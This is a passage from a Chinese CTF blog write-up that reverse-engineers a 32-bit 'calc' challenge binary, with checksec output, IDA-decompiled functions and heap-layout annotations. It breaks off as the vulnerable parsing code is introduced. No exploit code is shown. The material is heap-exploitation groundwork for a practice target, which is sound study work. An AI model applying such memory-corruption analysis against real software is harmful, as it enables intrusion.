@@ -1,0 +1,467 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="syzkaller编译及定制">
+<meta property="og:type" content="article">
+<meta property="og:title" content="calc heap">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2020/06/25/calc-heap/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="syzkaller编译及定制">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/06/25/calc-heap/image-20200626202214785.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/06/25/calc-heap/image-20200626232425175.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/06/25/calc-heap/image-20200627001525800.png">
+<meta property="article:published_time" content="2020-06-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-17T06:45:17.484Z">
+<meta property="article:author" content="blingbling">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2020/06/25/calc-heap/image-20200626202214785.png"><title>calc heap | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2020/06/25/calc-heap/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">calc heap</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-06-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-02-17</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h1 id="1-分析"   >
+          <a href="#1-分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-分析" class="headerlink" title="1 分析"></a>1 分析</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/assets/attachment/calc" >题目二进制</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>写write up之前，要吐槽一下，这又是一道做得让我怀疑人生的题。前后拖了一个月才狠下心把这题终于终于做完了。一点一点积累，希望一年或者几年后能看到自己的进步。</p>
+
+        <h2 id="1-1-查看程序基本信息"   >
+          <a href="#1-1-查看程序基本信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-1-查看程序基本信息" class="headerlink" title="1.1 查看程序基本信息"></a>1.1 查看程序基本信息</h2>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file calc</span></span><br><span class="line">calc: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=454ff27c25ea5028bffdcfaf81e1c178d5cbce3a, stripped</span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec calc</span></span><br><span class="line">[*] &#x27;/mnt/hgfs/VMshare/calc/calc&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="1-2-运行试试"   >
+          <a href="#1-2-运行试试" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-运行试试" class="headerlink" title="1.2 运行试试"></a>1.2 运行试试</h2>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./calc</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 1</span></span><br><span class="line">1</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 3</span></span><br><span class="line">3</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 1111</span></span><br><span class="line">1111</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 2+2</span></span><br><span class="line">invalid number</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 2 + 3</span></span><br><span class="line">5</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="1-3-IDA逆向"   >
+          <a href="#1-3-IDA逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-3-IDA逆向" class="headerlink" title="1.3 IDA逆向"></a>1.3 IDA逆向</h2>
+      <p>如下是IDA逆向出来，main函数中的主要代码，对这段代码进行分析。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">v13 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">dword_804D0B0 = sub_804A929();		<span class="comment">// 1</span></span><br><span class="line">dword_804D0B4 = sub_804A8E9();		<span class="comment">// 2</span></span><br><span class="line">dword_804D0AC = sub_804A8E9();		<span class="comment">// 3</span></span><br><span class="line">v0 = sub_804A83F(<span class="string">&quot;add&quot;</span>, (<span class="keyword">int</span>)sub_80494AA);	<span class="comment">//4</span></span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;add&quot;</span>, v0);		<span class="comment">//5</span></span><br><span class="line">v1 = sub_804A83F(<span class="string">&quot;sub&quot;</span>, (<span class="keyword">int</span>)sub_8049C81);	<span class="comment">//6</span></span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;sub&quot;</span>, v1);		<span class="comment">//7</span></span><br><span class="line">v2 = sub_804A83F(<span class="string">&quot;mul&quot;</span>, (<span class="keyword">int</span>)sub_8049A0E);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;mul&quot;</span>, v2);</span><br><span class="line">v3 = sub_804A83F(<span class="string">&quot;div&quot;</span>, (<span class="keyword">int</span>)sub_8049DED);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;div&quot;</span>, v3);</span><br><span class="line">v4 = sub_804A83F(<span class="string">&quot;mod&quot;</span>, (<span class="keyword">int</span>)sub_8049F90);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;mod&quot;</span>, v4);</span><br><span class="line">v5 = sub_804A83F(<span class="string">&quot;not&quot;</span>, (<span class="keyword">int</span>)sub_804A135);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;not&quot;</span>, v5);</span><br><span class="line">v6 = sub_804A83F(<span class="string">&quot;int&quot;</span>, (<span class="keyword">int</span>)sub_8049854);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;int&quot;</span>, v6);</span><br><span class="line">v7 = sub_804A83F(<span class="string">&quot;exit&quot;</span>, (<span class="keyword">int</span>)sub_804A688);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;exit&quot;</span>, v7);</span><br><span class="line">v8 = sub_804A83F(<span class="string">&quot;equals&quot;</span>, (<span class="keyword">int</span>)sub_804A3C2);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;equals&quot;</span>, v8);</span><br><span class="line">v9 = sub_804A83F(<span class="string">&quot;type&quot;</span>, (<span class="keyword">int</span>)sub_804A61E);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;type&quot;</span>, v9);</span><br><span class="line">v10 = sub_804A83F(<span class="string">&quot;len&quot;</span>, (<span class="keyword">int</span>)sub_804A308);</span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;len&quot;</span>, v10);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )		<span class="comment">//8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">256</span>, <span class="built_in">stdin</span>) )		<span class="comment">//9</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v11 = <span class="built_in">strrchr</span>(&amp;s, <span class="string">&#x27;\n&#x27;</span>);		<span class="comment">//10</span></span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    *v11 = <span class="number">0</span>;</span><br><span class="line">  sub_8048BC1(&amp;s);		<span class="comment">//11</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="line-1-2-3"   >
+          <a href="#line-1-2-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#line-1-2-3" class="headerlink" title="line 1 2 3"></a>line 1 2 3</h3>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dword_804D0B0 = sub_804A929();		<span class="comment">// 1</span></span><br><span class="line">dword_804D0B4 = sub_804A8E9();		<span class="comment">// 2</span></span><br><span class="line">dword_804D0AC = sub_804A8E9();		<span class="comment">// 3</span></span><br></pre></td></tr></table></div></figure>
+<p>dword_804D0B0，dword_804D0B4，dword_804D0AC都是bss段的变量，各占4个字节。这三个变量分别接受sub_804A929()和sub_804A8E9()这两个函数的返回值。下面我们来看看这两个函数。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804D0AC dword_804D0AC   dd ?                   </span><br><span class="line">.bss:0804D0AC                                      </span><br><span class="line">.bss:0804D0B0 ; int dword_804D0B0</span><br><span class="line">.bss:0804D0B0 dword_804D0B0   dd ?                  </span><br><span class="line">.bss:0804D0B0                                        </span><br><span class="line">.bss:0804D0B4 dword_804D0B4   dd ?   </span><br></pre></td></tr></table></div></figure>
+<ul>
+<li><p>sub_804A929()</p>
+<p>这个函数只有一句<code>return calloc(0x10u, 1u)</code>，申请大小为0x10的堆空间，并将堆的地址返回给dword_804D0B0。</p>
+</li>
+<li><p>sub_804A8E9()</p>
+<p>这个函数中申请了0x84大小的堆空间，并返回。因此dword_804D0B4，dword_804D0AC分别指向大小为0x84的堆。</p>
+</li>
+</ul>
+<p><img src="image-20200626202214785.png"></p>
+
+        <h3 id="line-4-5-6-7"   >
+          <a href="#line-4-5-6-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#line-4-5-6-7" class="headerlink" title="line 4 5 6 7"></a>line 4 5 6 7</h3>
+      <p>这四行以及之后的许多行都是在重复4 5行的函数，因此分析完前两个就能推断之后的操作。</p>
+<p>先看4 5 行，涉及两个函数sub_804A83F()和sub_804A946()，以及一个函数指针sub_80494AA和一个bss段的变量dword_804D0B0。接下来重点分析这两个函数。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0 = sub_804A83F(<span class="string">&quot;add&quot;</span>, (<span class="keyword">int</span>)sub_80494AA);	<span class="comment">//4</span></span><br><span class="line">sub_804A946(dword_804D0B0, <span class="string">&quot;add&quot;</span>, v0);		<span class="comment">//5</span></span><br></pre></td></tr></table></div></figure>
+
+        <h4 id="sub-804A83F"   >
+          <a href="#sub-804A83F" class="heading-link"><i class="fas fa-link"></i></a><a href="#sub-804A83F" class="headerlink" title="sub_804A83F()"></a>sub_804A83F()</h4>
+      <p>函数定义如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">sub_804A83F</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">calloc</span>(<span class="number">0x10</span>u, <span class="number">1u</span>);</span><br><span class="line">  *v2 = strdup(s);</span><br><span class="line">  v2[<span class="number">2</span>] = a2;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="string">&quot;function&quot;</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>输入为一个字符串和一个整型值（函数指针的地址）。函数内先申请一个大小为0x10的堆空间（*v2指向该堆空间），然后将输入的字符串地址（strdup申请了一个堆空间用来存放字符串）放在v2[0]；v2[1]处存放字符串”function”的地址，标志这是一个function堆；将传入的函数指针地址放在v2[2]；v2[3]置空。最后将该堆块返回给上一层调用者。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2堆块如下。以第4行为例，heap1中存放着字符串“add”；string1处的字符串为“function”；function1是一个处理add逻辑的函数。</span><br><span class="line">|------------|</span><br><span class="line">| &amp;heap1     |</span><br><span class="line">|------------|</span><br><span class="line">| &amp;string1   |</span><br><span class="line">|------------|</span><br><span class="line">| &amp;function1 |</span><br><span class="line">|------------|</span><br><span class="line">| 0          |</span><br><span class="line">|------------|</span><br></pre></td></tr></table></div></figure>
+
+        <h4 id="sub-804A946"   >
+          <a href="#sub-804A946" class="heading-link"><i class="fas fa-link"></i></a><a href="#sub-804A946" class="headerlink" title="sub_804A946()"></a>sub_804A946()</h4>
+      <p>以add为例，该函数的参数分别为dword_804D0B0（bss段的一个值，为一个堆块地址）， “add”字符串,，以及上一个函数sub_804A83F()的返回值（一个0x10大小的堆块）。sub_804A946()函数定义如下，我在函数中标记了注释。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804A946</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *s, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"><span class="comment">/*检查dword_804D0B0堆块第一个字节指向的堆块是否为空。如果是空，就申请一个大小为0x10的堆，并在该堆块偏移8字节处写入字符‘a’；如果非空，则跳过执行下面的部分。*/</span></span><br><span class="line">  <span class="keyword">if</span> ( !*a1 )	</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = <span class="built_in">calloc</span>(<span class="number">0x10</span>u, <span class="number">1u</span>);</span><br><span class="line">    *(*a1 + <span class="number">8</span>) = *s;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/*v5赋值dword_804D0B0堆块第一个字节指向的堆块地址（即*a1），v6赋值传入字符串s的长度。*/</span></span><br><span class="line">  v5 = *a1;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="comment">/*进入for循环处理字符串s*/</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/*1、判断dword_804D0B0堆块指向的堆块偏移4字节的位置是否不为空；2、判断dword_804D0B0堆块指向的堆块地址偏移8字节处是否跟字符串的第i个字符不相等。两个同时满足时执行v5 = *(v5 + 4)；其中一个不满足则跳过该操作，继续执行后续部分。*/</span></span><br><span class="line">    <span class="keyword">while</span> ( *(v5 + <span class="number">4</span>) &amp;&amp; *(v5 + <span class="number">8</span>) != s[i] )</span><br><span class="line">      v5 = *(v5 + <span class="number">4</span>);</span><br><span class="line"><span class="comment">/*如果此时v5堆块偏移8字节的位置跟s[i]的值不相等，则进入if语句中处理；如果两者相等，则复用该堆块，继续处理下一个字符。*/</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v5 + <span class="number">8</span>) != s[i] )</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">/*新申请一个0x10大小的堆块，并将堆块地址写到v5堆块偏移4字节的位置。然后将s[i]写到新申请的堆块偏移8字节的位置。然后让v5指向新申请的堆块。*/</span></span><br><span class="line">      *(v5 + <span class="number">4</span>) = <span class="built_in">calloc</span>(<span class="number">0x10</span>u, <span class="number">1u</span>);</span><br><span class="line">      *(*(v5 + <span class="number">4</span>) + <span class="number">8</span>) = s[i];</span><br><span class="line">      v5 = *(v5 + <span class="number">4</span>);</span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strlen</span>(s) &gt; i )</span><br><span class="line">      &#123;</span><br><span class="line">        *v5 = <span class="built_in">calloc</span>(<span class="number">0x10</span>u, <span class="number">1u</span>);</span><br><span class="line">        *(*v5 + <span class="number">8</span>) = s[++i];</span><br><span class="line">        v5 = *v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*如果s[i]为空，即到了字符串的结束位置，则结束循环。*/</span></span><br><span class="line">    <span class="keyword">if</span> ( !s[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/*如果*v5为空，新申请一个0x10大小的堆块，并让*v5指向该对堆块。然后将s[i+1]处的字符写到新申请堆块偏移8字节的位置。*/</span></span><br><span class="line">    <span class="keyword">if</span> ( !*v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v5 = <span class="built_in">calloc</span>(<span class="number">0x10</span>u, <span class="number">1u</span>);</span><br><span class="line">      *(*v5 + <span class="number">8</span>) = s[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*让v5指向*v5指向的堆块*/</span></span><br><span class="line">    v5 = *v5;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/*上述循环将所有的字符全部处理完毕后，将v5当前指向堆块的地址给result*/</span></span><br><span class="line">  result = v5;</span><br><span class="line"><span class="comment">/*将a3（即sub_804A83F()返回的堆块）的地址写到v5堆块内偏移12字节的位置*/</span></span><br><span class="line">  *(v5 + <span class="number">12</span>) = a3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>执行完4 5 6 7行后，会形成如下图所示的堆空间关系：</p>
+<p><img src="image-20200626232425175.png"></p>
+
+        <h3 id="line-8"   >
+          <a href="#line-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#line-8" class="headerlink" title="line 8"></a>line 8</h3>
+      <p>这个while循环内会对输入进行处理，是跟外部数据交互的窗口，因此漏洞极有可能存在于循环内部的处理过程。</p>
+
+        <h3 id="line-9"   >
+          <a href="#line-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#line-9" class="headerlink" title="line 9"></a>line 9</h3>
+      <p>这一行通过fgets从标准输入（即键盘）中获取输入字符串。根据fgets的特性，本题中它最多接受<code>256-1=255</code>个字符输入。s在栈上的空间为0x100=256，加上字符串结束符’\x00’也不会溢出。</p>
+<blockquote>
+<p><strong>char *fgets(char *str, int n, FILE *stream)</strong> 从指定的流 stream 读取一行，并把它存储在 <strong>str</strong> 所指向的字符串内。当读取 <strong>(n-1)</strong> 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止。</p>
+</blockquote>
+
+        <h3 id="line-10"   >
+          <a href="#line-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#line-10" class="headerlink" title="line 10"></a>line 10</h3>
+      <p>这一行及后两行的目的是对输入字符串进行处理。寻找输入字符串最后一次出现’\n’的位置，即字符串结束的位置，并往该位置写0x00（是ASCII码的0，而不是字符 ‘0’。）</p>
+
+        <h3 id="line11"   >
+          <a href="#line11" class="heading-link"><i class="fas fa-link"></i></a><a href="#line11" class="headerlink" title="line11"></a>line11</h3>
+      <p>第11行是函数sub_8048BC1(&amp;s)，处理输入的字符串s。使用strtok将字符串s进行分解。</p>
+<blockquote>
+<p>char *strtok(char *str, const char *delim) 分解字符串 str 为一组字符串，delim 为分隔符。</p>
+</blockquote>
+<p>这个函数中，有三个大的处理逻辑：</p>
+<ul>
+<li>while ( s1 )：对传入字符串分解得到的运算数和运算符进行解析，并将运算数链接到bss段的dword_804D0B4，将运算符链接到bss段的dword_804D0AC。</li>
+<li>while ( !sub_804A8D7(dword_804D0AC) )：判断dword_804D0AC指向堆空间的第一个值是否为0（第一个值代表运算符个数），即判断是否存在运算符。</li>
+<li>if ( !result )</li>
+</ul>
+
+        <h4 id="while-s1"   >
+          <a href="#while-s1" class="heading-link"><i class="fas fa-link"></i></a><a href="#while-s1" class="headerlink" title="while(s1)"></a>while(s1)</h4>
+      <p>如下对运算数的处理中存在漏洞函数。重点看a和b两段指令。</p>
